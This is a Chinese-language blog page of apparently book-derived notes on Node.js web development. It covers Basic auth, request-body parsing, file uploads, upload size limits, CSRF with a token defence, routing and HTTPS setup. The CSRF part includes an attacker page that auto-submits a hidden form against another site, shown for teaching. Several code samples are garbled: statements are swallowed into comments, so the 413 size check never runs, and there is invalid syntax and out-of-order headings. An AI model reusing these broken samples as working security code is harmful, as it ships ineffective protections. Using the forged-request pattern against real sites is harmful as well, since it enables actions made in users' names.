class="string">'WWW-Authenticate'</span>, <span class="string">'Basic realm="Secure Area"'</span>);</div><div class="line">  res.writeHead(<span class="number">401</span>);</div><div class="line">  res.end();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  handle(req, res);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在上面的代码中，响应头中的<code>WWW-Authenticate</code> 字段告知浏览器采用什么样的认证和加密方式。一般而言，未认证的情况下，浏览器会弹出对话框进行交互式提交认证信息，如图8-2所示。<br>图8-2　浏览器弹出的交互式提交认证信息的对话框当认证通过，服务器端响应200状态码之后，浏览器会保存用户名和密码口令，在后续的请求中都携带上Authorization信息。<br>Basic认证有太多的缺点，它虽然经过Base64加密后在网络中传送，但是这近乎于明文，十分危险，一般只有在HTTPS的情况下才会使用。不过Basic认证的支持范围十分广泛，几乎所有的浏览器都支持它。为了改进Basic认证，RFC 2069规范提出了摘要访问认证，它加入了服务器端随机数来保护认证过程，在此不做深入的解释。</p>
<h3 id="8-2-数据上传"><a href="#8-2-数据上传" class="headerlink" title="8.2 数据上传"></a>8.2 数据上传</h3><h3 id="数据上传"><a href="#数据上传" class="headerlink" title="数据上传"></a>数据上传</h3><p>上述的内容基本都集中在HTTP请求报文头中，适用于GET请求和大多数其他请求。头部报文中的内容已经能够让服务器端进行大多数业务逻辑操作了，但是单纯的头部报文无法携带大量的数据，在业务中，我们往往需要接收一些数据，比如表单提交、文件提交、JSON上传、XML上传等。</p>
<p>Node的http模块只对HTTP报文的头部进行了解析，然后触发request事件。如果请求中还带有内容部分（如POST请求，它具有报头和内容），内容部分需要用户自行接收和解析。通过报头的Transfer-Encoding或Content-Length即可判断请求中是否带有内容，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> hasBody = <span class="function"><span class="keyword">function</span> (<span class="params">req</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="string">'transfer-encoding'</span> <span class="keyword">in</span> req.headers || <span class="string">'content-length'</span> <span class="keyword">in</span> req.headers;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在HTTP_Parser解析报头结束后，报文内容部分会通过data事件触发，我们只需以流的方式处理即可，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (hasBody(req)) &#123;</div><div class="line">    <span class="keyword">var</span> buffers = [];</div><div class="line">    req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">      buffers.push(chunk);</div><div class="line">    &#125;);</div><div class="line">    req.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">      req.rawBody = Buffer.concat(buffers).toString();</div><div class="line">      handle(req, res);</div><div class="line">    &#125;);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>将接收到的Buffer列表转化为一个Buffer对象后，再转换为没有乱码的字符串，暂时挂置在req.rawBody处。</p>
<h3 id="8-2-1-表单数据"><a href="#8-2-1-表单数据" class="headerlink" title="8.2.1 表单数据"></a>8.2.1 表单数据</h3><h3 id="表单数据"><a href="#表单数据" class="headerlink" title="表单数据"></a>表单数据</h3><p>最为常见的数据提交就是通过网页表单提交数据到服务器端，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;form action=&quot;/upload&quot; method=&quot;post&quot;&gt;</div><div class="line">  &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; /&gt;</div><div class="line">  &lt;br /&gt;</div><div class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
<p>默认的表单提交，请求头中的<code>Content-Type</code> 字段值为<code>application/x-www-form-urlencoded</code> ，</p>
<p>如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Content-Type: application/x-www-form-urlencoded</div></pre></td></tr></table></figure>
<p>由于它的报文体内容跟查询字符串相同：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">foo=bar&amp;baz=val</div></pre></td></tr></table></figure>
<p>因此解析它十分容易：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (req.headers[<span class="string">'content-type'</span>] === <span class="string">'application/x-www-form-urlencoded'</span>) &#123;</div><div class="line">    req.body = querystring.parse(req.rawBody);</div><div class="line">  &#125;</div><div class="line">  todo(req, res);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>后续业务中直接访问<code>req.body</code>就可以得到表单中提交的数据。</p>
<h3 id="8-2-2-其他格式"><a href="#8-2-2-其他格式" class="headerlink" title="8.2.2 其他格式"></a>8.2.2 其他格式</h3><p>除了表单数据外，常见的提交还有JSON和XML文件等，判断和解析他们的原理都比较相似，都是依据Content-Type中的值决定，其中JSON类型的值为application/json，XML的值为application/xml。</p>
<p>需要注意的是，在Content-Type中可能还附带如下所示的编码信息：Content-Type: application/json; charset=utf-8</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> mime = <span class="function"><span class="keyword">function</span> (<span class="params">req</span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> str = req.headers[<span class="string">'content-type'</span>] || <span class="string">''</span>; <span class="keyword">return</span> str.split(<span class="string">';'</span>)[<span class="number">0</span>];</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>解析XML文件稍微复杂一点，但是社区有支持XML文件到JSON对象转换的库，这里以xml2js模块为例，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> xml2js = <span class="built_in">require</span>(<span class="string">'xml2js'</span>);</div><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (mime(req) === <span class="string">'application/xml'</span>) &#123;</div><div class="line">    xml2js.parseString(req.rawBody, <span class="function"><span class="keyword">function</span> (<span class="params">err, xml</span>) </span>&#123;</div><div class="line">      <span class="keyword">if</span> (err) &#123;</div><div class="line">        <span class="comment">// 异常内容，响应Bad request res.writeHead(400);</span></div><div class="line">        res.end(<span class="string">'Invalid XML'</span>);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">      &#125;</div><div class="line">      req.body = xml;</div><div class="line">      todo(req, res);</div><div class="line">    &#125;);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="8-2-3-附件上传"><a href="#8-2-3-附件上传" class="headerlink" title="8.2.3 附件上传"></a>8.2.3 附件上传</h3><p>附件上传<br>除了常见的表单和特殊格式的内容提交外，还有一种比较独特的表单。通常的表单，其内容可以通过urlencoded的方式编码内容形成报文体，再发送给服务器端，但是业务场景往往需要用户直接提交文件。在前端HTML代码中，特殊表单与普通表单的差异在于该表单中可以含有file类型的控件，以及需要指定表单属性enctype为multipart/form-data，如下所示：<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/upload"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">id</span>=<span class="string">"username"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">br</span> /&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>浏览器在遇到multipart/form-data表单提交时，构造的请求报文与普通表单完全不同。首先它的报头中最为特殊的如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Content-Type: multipart/form-data; </div><div class="line">boundary=AaB03x </div><div class="line">Content-Length: 18231</div></pre></td></tr></table></figure>
<p>它代表本次提交的内容是由多部分构成的，其中<code>boundary=AaB03x</code>指定的是每部分内容的分界符，AaB03x是随机生成的一段字符串，报文体的内容将通过在它前面添加–进行分割，报文结束时在它前后都加上–表示结束。另外，Content-Length的值必须确保是报文体的长度。假设上面的表单选择了一个名为diveintonode.js的文件，并进行提交上传，那么生成的报文如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">--AaB03x\r\n </div><div class="line">Content-Disposition: form-data; </div><div class="line">name=&quot;username&quot;\r\n</div><div class="line">\r\n Jackson Tian\r\n</div><div class="line">--AaB03x\r\n </div><div class="line">Content-Disposition: form-data; </div><div class="line">name=&quot;file&quot;;</div><div class="line">filename=&quot;diveintonode.js&quot;\r\n</div><div class="line">Content-Type: application/javascript\r\n \r\n</div><div class="line">... contents of diveintonode.js ... </div><div class="line">--AaB03x--</div></pre></td></tr></table></figure>
<p>普通的表单控件的报文体如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">--AaB03x\r\n</div><div class="line">Content-Disposition: form-data; name=&quot;username&quot;\r\n \r\n</div><div class="line">Jackson Tian\r\n</div></pre></td></tr></table></figure>
<p>文件控件形成的报文如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">--AaB03x\r\n </div><div class="line">Content-Disposition: form-data; </div><div class="line">name=&quot;file&quot;;</div><div class="line">filename=&quot;diveintonode.js&quot;\r\n</div><div class="line">Content-Type: application/javascript\r\n \r\n</div><div class="line">... contents of diveintonode.js ...</div></pre></td></tr></table></figure>
<p>一旦我们知晓报文是如何构成的，那么解析它就变得十分容易。值得注意的一点是，由于是文件上传，那么像普通表单、JSON或XML那样先接收内容再解析的方式将变得不可接受。接收大小未知的数据量时，我们需要十分谨慎，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (hasBody(req)) &#123;</div><div class="line">    <span class="keyword">var</span> done = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">      handle(req, res);</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">if</span> (mime(req) === <span class="string">'application/json'</span>) &#123;</div><div class="line">      parseJSON(req, done);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mime(req) === <span class="string">'application/xml'</span>) &#123;</div><div class="line">      parseXML(req, done);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mime(req) === <span class="string">'multipart/form-data'</span>) &#123;</div><div class="line">      parseMultipart(req, done);</div><div class="line">    &#125;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里我们将req这个流对象直接交给对应的解析方法，由解析方法自行处理上传的内容，或接收内容并保存在内存中，或流式处理掉</p>
<p>这里要介绍到的模块是formidable。它基于流式处理解析报文，将接收到的文件写入到系统的临时文件夹中，并返回对应的路径，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> formidable = <span class="built_in">require</span>(<span class="string">'formidable'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (hasBody(req)) &#123;</div><div class="line">    <span class="keyword">if</span> (mime(req) === <span class="string">'multipart/form-data'</span>) &#123;</div><div class="line">      <span class="keyword">var</span> form = <span class="keyword">new</span> formidable.IncomingForm();</div><div class="line">      form.parse(req, <span class="function"><span class="keyword">function</span> (<span class="params">err, fields,</span></span></div><div class="line">        files) &#123;</div><div class="line">        req.body = fields;</div><div class="line">        req.files = files;</div><div class="line">        handle(req, res);</div><div class="line">      &#125;);</div><div class="line">    &#125;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>因此在业务逻辑中只要检查req.body和req.files中的内容即可。</p>
<h3 id="8-2-4-数据上传与安全"><a href="#8-2-4-数据上传与安全" class="headerlink" title="8.2.4 数据上传与安全"></a>8.2.4 数据上传与安全</h3><h3 id="数据上传与安全"><a href="#数据上传与安全" class="headerlink" title="数据上传与安全"></a>数据上传与安全</h3><p>Node提供了相对底层的API，通过它构建各种各样的Web应用都是相对容易的，但是在Web应用中，不得不重视与数据上传相关的安全问题。由于Node与前端JavaScript的近缘性，前端JavaScript甚至可以上传到服务器直接执行，但在这里我们并不讨论这样危险的动作，而是介绍内存和CSRF相关的安全问题。</p>
<ol>
<li>内存限制<br>在解析表单、JSON和XML部分，我们采取的策略是先保存用户提交的所有数据，然后再解析处理，最后才传递给业务逻辑。这种策略存在潜在的问题是，它仅仅适合数据量小的提交请求，一旦数据量过大，将发生内存被占光的情况。攻击者通过客户端能够十分容易地模拟伪造大量数据，如果攻击者每次提交1 MB的内容，那么只要并发请求数量一大，内存就会很快地被吃光。要解决这个问题主要有两个方案。</li>
</ol>
<p>限制上传内容的大小，一旦超过限制，停止接收数据，并响应400状态码。通过流式解析，将数据流导向到磁盘中，Node只保留文件路径等小数据。</p>
<p>流式处理在上文的文件上传中已经有所体现，这里介绍一下Connect中采用的上传数据量的限制方式，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> bytes = <span class="number">1024</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> received = <span class="number">0</span>,</div><div class="line">    <span class="keyword">var</span> len = req.headers[<span class="string">'content-length'</span>] ?</div><div class="line">      <span class="built_in">parseInt</span>(req.headers[<span class="string">'content-length'</span>], <span class="number">10</span>) : <span class="literal">null</span>;</div><div class="line">  <span class="comment">// 如果内容超过长度限制，返回请求实体过长的状态码 if (len &amp;&amp; len &gt;</span></div><div class="line">  bytes) &#123;</div><div class="line">  res.writeHead(<span class="number">413</span>);</div><div class="line">  res.end();</div><div class="line">  <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// limit</span></div><div class="line">req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">  received += chunk.length;</div><div class="line">  <span class="keyword">if</span> (received &gt; bytes) &#123; <span class="comment">// 停止接收数据，触发end()</span></div><div class="line">    req.destroy();</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line">handle(req, res);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>上面的代码中我们可以看到，数据是由包含Content-Length的请求报文判断是否长度超过限制的，超过则直接响应413状态码。对于没有Content-Length的请求报文，略微简略一点，在每个data事件中判定即可。一旦超过限制值，服务器停止接收新的数据片段。如果是JSON文件或XML文件，极有可能无法完成解析。对于上线的Web应用，添加一个上传大小限制十分有利于保护服务器，在遭遇攻击时，能镇定从容应对。</p>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF的全称是<code>Cross-Site Request Forgery</code>，中文意思为<code>跨站请求伪造</code>。前文提及了服务器端与客户端通过Cookie来标识和认证用户，通常而言，用户通过浏览器访问服务器端的Session ID是无法被第三方知道的，但是CSRF的攻击者并不需要知道Session ID就能让用户中招。为了详细解释CSRF攻击是怎样一个过程，这里以一个留言的例子来说明。假设某个网站有这样一个留言程序，提交留言的接口如下所示：</p>
<p><a href="http://domain_a.com/guestbook" target="_blank" rel="external">http://domain_a.com/guestbook</a></p>
<p>用户通过POST提交content字段就能成功留言。</p>
<p>服务器端会自动从Session数据中判断是谁提交的数据，补足username和updatedAt两个字段后向数据库中写入数据，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> content = req.body.content || <span class="string">''</span>;</div><div class="line">  <span class="keyword">var</span> username = req.session.username;</div><div class="line">  <span class="keyword">var</span> feedback = &#123;</div><div class="line">    <span class="attr">username</span>: username,</div><div class="line">    <span class="attr">content</span>: content,</div><div class="line">    <span class="attr">updatedAt</span>: <span class="built_in">Date</span>.now()</div><div class="line">  &#125;;</div><div class="line">  db.save(feedback, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'Ok'</span>);</div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>正常的情况下，谁提交的留言，就会在列表中显示谁的信息。如果某个攻击者发现了这里的接口存在CSRF漏洞，那么他就可以在另一个网站（<a href="http://domain_b.com/attack）上构造了一个表单提交，如下所示：" target="_blank" rel="external">http://domain_b.com/attack）上构造了一个表单提交，如下所示：</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"http://domain_a.com/guestbook"</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">"vim是这个世界上最好的编辑器"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">  $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    $(<span class="string">"#test"</span>).submit();</div><div class="line">  &#125;);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这种情况下，攻击者只要引诱某个<code>domain_a</code>的登录用户访问这个<code>domain_b</code>的网站，就会自动提交一个留言。由于在提交到<code>domain_a</code>的过程中，浏览器会将<code>domain_a</code>的Cookie发送到服务器，尽管这个请求是来自domain_b的，但是服务器并不知情，用户也不知情。以上过程就是一个CSRF攻击的过程。这里的示例仅仅是一个留言的漏洞，如果出现漏洞的是转账的接口，那么其危害程度可想而知。</p>
<p>尽管通过Node接收数据提交十分容易，但是安全问题还是不容忽视。好在CSRF并非不可防御，解决CSRF攻击的方案有添加随机值的方式，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> generateRandom = <span class="function"><span class="keyword">function</span> (<span class="params">len</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> crypto.randomBytes(<span class="built_in">Math</span>.ceil(len *</div><div class="line">      <span class="number">3</span> / <span class="number">4</span>))</div><div class="line">    .toString(<span class="string">'base64'</span>).slice(<span class="number">0</span>, len);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>也就是说，为每个请求的用户，在Session中赋予一个随机值，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> token = req.session._csrf || (req.session._csrf = generateRandom(<span class="number">24</span>));</div></pre></td></tr></table></figure>
<p>在做页面渲染的过程中，将这个_csrf值告之前端，如下所示：<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"http://domain_a.com/guestbook"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">"vim是这个世界上最好的编辑器"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"_csrf"</span> <span class="attr">value</span>=<span class="string">"&lt;%=_csrf%&gt;"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>由于该值是一个随机值，攻击者构造出相同的随机值的难度相当大，所以我们只需要在接收端做一次校验就能轻易地识别出该请求是否为伪造的，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> token = req.session._csrf || (req.session._csrf = generateRandom(<span class="number">24</span>));</div><div class="line">  <span class="keyword">var</span> _csrf = req.body._csrf;</div><div class="line">  <span class="keyword">if</span> (token !== _csrf) &#123;</div><div class="line">    res.writeHead(<span class="number">403</span>);</div><div class="line">    res.end(<span class="string">"禁止访问"</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>_csrf字段也可以存在于查询字符串或者请求头中。</p>
<h3 id="8-3-1-文件路径型"><a href="#8-3-1-文件路径型" class="headerlink" title="8.3.1 文件路径型"></a>8.3.1 文件路径型</h3><p>在MVC模式流行起来之前，根据文件路径执行动态脚本也是基本的路由方式，它的处理原理是Web服务器根据URL路径找到对应的文件，如/index.asp或/index.php。Web服务器根据文件名后缀去寻找脚本的解析器，并传入HTTP请求的上下文。</p>
<h3 id="8-3-2-MVC"><a href="#8-3-2-MVC" class="headerlink" title="8.3.2 MVC"></a>8.3.2 MVC</h3><p>在MVC流行之前，主流的处理方式都是通过文件路径进行处理的，甚至以为是常态。直到有一天开发者发现用户请求的URL路径原来可以跟具体脚本所在的路径没有任何关系。</p>
<p>MVC模型的主要思想是将业务逻辑按职责分离，主要分为以下几种。</p>
<ul>
<li>控制器（Controller），一组行为的集合。</li>
<li>模型（Model），数据相关的操作和封装。</li>
<li>视图（View），视图的渲染。</li>
</ul>
<p>它的工作模式如下说明。</p>
<p>路由解析，根据URL寻找到对应的控制器和行为。<br>行为调用相关的模型，进行数据操作。<br>数据操作结束后，调用视图和相关数据进行页面渲染，输出到客户端。</p>
<p>如何根据URL做路由映射，这里有两个分支实现。一种方式是通过手工关联映射，一种是自然关联映射。前者会有一个对应的路由文件来将URL映射到对应的控制器，后者没有这样的文件。<br>图8-3　分层模式</p>
<p>手工映射<br>手工映射除了需要手工配置路由外较为原始外，它对URL的要求十分灵活，几乎没有格式上的限制。</p>
<p>手工映射十分方便，由于它对URL十分灵活，所以我们可以将两个路径都映射到相同的业务逻辑，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">use(<span class="string">'/user/setting'</span>, exports.setting);</div><div class="line">use(<span class="string">'/setting/user'</span>, exports.setting);</div><div class="line"><span class="comment">// 甚至 use('/setting/user/jacksontian',exports.setting);</span></div></pre></td></tr></table></figure>
<p>正则匹配对于简单的路径，采用上述的硬匹配方式即可，但是如下的路径请求就完全无法满足需求了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/profile/jacksontian</div><div class="line">/profile/hoover</div></pre></td></tr></table></figure>
<p>这些请求需要根据不同的用户显示不同的内容，这里只有两个用户，假如系统中存在成千上万个用户，我们就不太可能去手工维护所有用户的路由请求，因此正则匹配应运而生，我们期望通过以下的方式就可以匹配到任意用户：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">use(<span class="string">'/profile/:username'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123; </div><div class="line">  <span class="comment">// TODO</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>于是我们改进我们的匹配方式，在通过use注册路由时需要将路径转换为一个正则表达式，然后通过它来进行匹配，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> pathRegexp = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</div><div class="line">  path = path</div><div class="line">    .concat(strict ? <span class="string">''</span> : <span class="string">'/?'</span>).replace(<span class="regexp">/\/\(/g</span>, <span class="string">'(?:/'</span>)</div><div class="line">    .replace(<span class="regexp">/(\/)?(\.)?:(\w+)(?:(\(.*?\)))?(\?)?(\*)?/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">_, slash, format, key, capture, optional, star</span>) </span>&#123;</div><div class="line">      slash = slash || <span class="string">''</span>;</div><div class="line">      <span class="keyword">return</span> <span class="string">''</span> + (optional ? <span class="string">''</span> : slash)\ + <span class="string">'(?:'</span> + (optional ? slash : <span class="string">''</span>)\ + (format || <span class="string">''</span>) + (capture || (format &amp;&amp; <span class="string">'([^/.]+?)'</span> || <span class="string">'([^/]+?)'</span>)) + <span class="string">')'</span> + (optional || <span class="string">''</span>)\ + (star ? <span class="string">'(/*)?'</span> : <span class="string">''</span>);</div><div class="line">    &#125;)</div><div class="line">    .replace(<span class="regexp">/([\/.])/g</span>, <span class="string">'\\$1'</span>).replace(<span class="regexp">/\*/g</span>, <span class="string">'(.*)'</span>);</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'^'</span> + path + <span class="string">'$'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上述正则表达式十分复杂，总体而言，它能实现如下的匹配：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/profile/:username =&gt; /profile/jacksontian, </div><div class="line">/profile/hoover /user.:ext =&gt; /user.xml, /user.json</div></pre></td></tr></table></figure>
<p>现在我们重新改进注册部分：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> use = <span class="function"><span class="keyword">function</span> (<span class="params">path, action</span>) </span>&#123;</div><div class="line">  routes.push([pathRegexp(path), action]);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>以及匹配部分：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> pathname = url.parse(req.url).pathname;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; routes.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> route = routes[i]; <span class="comment">// 正则匹配</span></div><div class="line">    <span class="keyword">if</span> (route[<span class="number">0</span>].exec(pathname)) &#123;</div><div class="line">      <span class="keyword">var</span> action = route[<span class="number">1</span>];</div><div class="line">      action(req, res);</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// 处理404请求 handle404(req, res);</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="7-5-3-HTTPS服务-1"><a href="#7-5-3-HTTPS服务-1" class="headerlink" title="7.5.3 HTTPS服务"></a>7.5.3 HTTPS服务</h3><p>创建HTTPS服务只比HTTP服务多一个选项配置，其余地方几乎相同，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> options = &#123;</div><div class="line">  <span class="attr">key</span>: fs.readFileSync(<span class="string">'./keys/server.key'</span>),</div><div class="line">  <span class="attr">cert</span>: fs.readFileSync(<span class="string">'./keys/server.crt'</span>)</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>启动之后通过curl进行测试</p>
<p>由于是自签名的证书，curl工具无法验证服务器端证书是否正确，所以出现了上述的抛错，要解决上面的问题有两种方式。一种是加-k选项，让curl工具忽略掉证书的验证，这样的结果是数据依然会通过公钥加密传输，但是无法保证对方是可靠的，会存在中间人攻击的潜在风险。</p>
<p>另一种解决的方式是给curl设置–cacert选项，告知CA证书使之完成对服务器证书的验证，</p>
